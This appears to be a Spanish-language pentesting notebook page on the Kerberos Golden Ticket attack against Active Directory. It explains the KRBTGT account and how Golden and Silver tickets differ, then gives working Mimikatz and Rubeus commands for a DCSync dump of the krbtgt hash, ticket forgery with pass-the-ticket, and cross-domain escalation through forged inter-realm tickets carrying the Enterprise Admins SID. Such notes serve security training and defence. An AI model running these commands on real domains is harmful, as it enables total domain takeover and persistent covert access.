# Golden Ticket 

Tags: #AD #Windows #GoldenTicket #Persistencia 

Un **Golden Ticket** es un Ticket Granting Ticket (TGT) generado de manera fraudulenta utilizando la clave secreta del dominio asociada a la cuenta **KRBTGT**. Esta cuenta, presente en Active Directory, es responsable de firmar todos los TGTs, y su clave secreta es conocida únicamente por los Controladores de Dominio. Si un atacante logra obtener el hash de esta clave, por medio de técnicas como extracción de hash o un ataque **Pass-the-Hash**, puede crear un TGT válido que le permite autenticarse como cualquier usuario y acceder a cualquier servicio dentro del dominio, sin restricciones.

```bash 
¿Cómo funciona el ataque de Golden Ticket?

1. El atacante obtiene el hash de la clave KRBTGT, generalmente comprometiendo primero un dominio con privilegios de administrador.
2. Utiliza ese hash para crear un TGT para el dominio de AD que el sistema considerará auténtico porque está firmado con la clave correcta.
3. El atacante presenta el TGT al servicio de Ticket Granting Service (TGS) cada vez que necesita acceder a un recurso, y recibe tickets de servicio (ST) sin necesidad de autenticación adicional.
4. El atacante puede entonces acceder a cualquier recurso dentro del dominio, como si fuera cualquier usuario, incluyendo cuentas de administrador.
    

Riesgos del Golden Ticket:
- El atacante tiene control total sobre el dominio de AD y puede acceder a cualquier recurso.
- Puede ser utilizado para moverse lateralmente a través de la red.
- Permite al atacante mantener un acceso persistente y difícil de detectar a la red.
```

## Diferencias entre Silver Ticket y Golden Ticket

```bash 
Golden Ticket:
- Un Golden Ticket es un Ticket Granting Ticket (TGT) falsificado 
- Se crea después de que el atacante obtiene acceso al hash de la contraseña de la cuenta `KRBTGT`, que es la cuenta de servicio de dominio en Active Directory responsable de firmar todos los TGT.
- Con un Golden Ticket, un atacante puede crear TGTs para cualquier cuenta de usuario en el dominio, lo que le permite obtener acceso a casi todos los recursos y servicios en ese dominio de AD.
- Esencialmente, brinda acceso ilimitado y persistente al atacante hasta que la contraseña de la cuenta `KRBTGT` sea cambiada o el ticket expire (lo que puede ser configurado para que nunca ocurra).
- Un Golden Ticket es utilizado para autenticarse con el Ticket Granting Service (TGS) de Kerberos para obtener tickets de servicio para otros servicios dentro del dominio.


Silver Ticket:
- Un Silver Ticket es un Ticket de Servicio (ST) falsificado.
- Se crea después de que el atacante obtiene acceso al hash de la contraseña de una cuenta de servicio específica (por ejemplo, una cuenta que ejecuta un servidor SQL, una cuenta de computadora para un servidor de archivos, etc.).
- Con un Silver Ticket, un atacante puede acceder a un servicio específico para el que el ticket ha sido creado, pero no tiene acceso ilimitado a todos los servicios del dominio.
- Ofrece un nivel de persistencia y discreción, ya que puede pasar desapercibido más fácilmente que un Golden Ticket. Esto es porque el Silver Ticket solo interactúa con el servicio específico, y no con el TGS (que podría registrar y auditar peticiones sospechosas).
```

## Que es KRBTGT?

```bash 
1. Función en Kerberos:
    - 'KRBTGT' es el principal de seguridad para el servicio de Kerberos en un dominio de Active Directory.
    - Se usa para firmar y cifrar todos los Ticket Granting Tickets (TGT) emitidos por el servicio de Kerberos dentro del dominio.
    - Cuando un usuario se autentica a través de Kerberos, se le entrega un TGT cifrado y firmado que acredita su identidad frente al Ticket Granting Service (TGS).
 
2. Seguridad de la cuenta:
    - La cuenta 'KRBTGT' tiene un conjunto de credenciales asociadas (es decir, un hash de contraseña), que son usadas para proteger los TGT.
    - La contraseña de esta cuenta no se utiliza para la autenticación interactiva, y normalmente no se cambia regularmente, aunque las buenas prácticas de seguridad recomiendan cambiarla al menos una vez cada cierto tiempo (especialmente después de un incidente de seguridad).
        
3. Riesgos de seguridad:
    - Si un atacante obtiene el hash de la contraseña de la cuenta 'KRBTGT', puede generar Golden Tickets, que permiten una amplia libertad para autenticarse en cualquier parte del dominio como cualquier usuario.
    - Es esencial mantener la seguridad de esta cuenta, ya que su compromiso puede resultar en una pérdida total del control sobre los recursos de Active Directory.
        
    
4. Medidas de protección:
    - La cuenta 'KRBTGT' está deshabilitada para el inicio de sesión, lo que significa que no se puede usar para acceder a un sistema de forma interactiva o a través de la red.
    - Debe ser protegida con una contraseña fuerte y compleja, y como medida de mitigación contra los ataques de Golden Ticket, se recomienda cambiar su contraseña dos veces en una rápida sucesión como parte de una corrección tras un incidente de seguridad.
```

```powershell 
❯ mimikatz.exe 
	# lsadump::dcsync /domain:domain1.corp /user:krbtgt  
	# exit
```

## Golden Ticket tradicional utilizando Mimikatz

```powershell 
❯ klist
❯ dir \\First-DC.domain1.corp\c$
❯ nltest /domain_trusts /v       # Se puede ver las relaciones de confianza entre los dominios y sus SID.


❯ mimikatz.exe     # Los tickets solicitados se guradan en 'cache'
	# kerberos::golden /user:Administrator /domain:domain1.corp /sid:S-1-5-21-1861162130-2580302541-221646211 /krbtgt:b44daa015f201fa31126895ebbcbbcab /ticket:evil.tck /ptt
	# exit 

Notas:
	# krbtgt = Hash que se obtiene con el DCSync 
	# Se puede ejecutar el comando sin agregar '/ptt' con el fin de guardar el archivo 'evil.tck' que es el que contiene el 'Golden ticket' 


❯ klist
❯ dir \\First-DC.domain1.corp\c$
```

## Golden Ticket Inter-realm TGT

```powershell 
# Forma para moverte entre dominios, se debe tener privilegios administrativos y se debe de asegurar con la herramienta de 'BloodHound' que se exista esa relación de confianza entre los dominios


1. Extracción de la Clave Secreta del Dominio: Primero, el atacante utiliza 'mimikatz' para extraer las claves secretas (hashes) de la cuenta krbtgt del dominio objetivo. El comando 'lsadump::trust /patch' revela la información necesaria, incluyendo los hashes de diferentes algoritmos de cifrado como AES y RC4.

❯ mimikatz.exe
	# lsadump::trust /patch
	# exit 

2. Creación del Golden Ticket: Utilizando la clave secreta extraída (RC4_HMAC hash) y el SID del dominio 'DOMAIN1.CORP', el atacante crea un Golden Ticket para el dominio 'DOMAIN2.CORP'. Este tique le otorga al atacante los mismos privilegios que tendría un administrador del dominio.

❯ mimikatz.exe
	# kerberos::golden /domain:domain1.corp /sid:S-1-5-21-1861162130-2580302541-221646211 /sids:S-1-5-21-3191546187-884582097-4033286759-519 /rc4:a9e60b71ecaab835b49ec6a56ca99af5 /user:Administrator /service:krbtgt /target:domain2.corp /ticket:ticketpremium.kirbi
	# exit 

Nota: Los datos los extraemos del comando anterior en el paso 1.
	# domain = Dominio primario 
	# sid = SID del dominio primario 
	# sids = SID del dominio secundario 
	# 519 = Indentifica los grupos de 'Enterprise Admins'
	# rc4 = Es el rc4_hmac_nt que extrae el comando del paso 1


3. Importación y Uso del Ticket: A través de 'Rubeus', una herramienta complementaria a 'mimikatz' para operaciones con tiques Kerberos, el atacante importa el Golden Ticket y solicita un tique de servicio (TGS) para el recurso deseado en el dominio 'DOMAIN2.CORP'

❯ Rubeus.exe asktgs /ticket:ticketpremium.kirbi /service:CIFS/second-dc.domain2.corp /dc:second-dc.domain2.corp /ptt

❯ klist
❯ dir \\second-dc.domain2.corp\c$\
```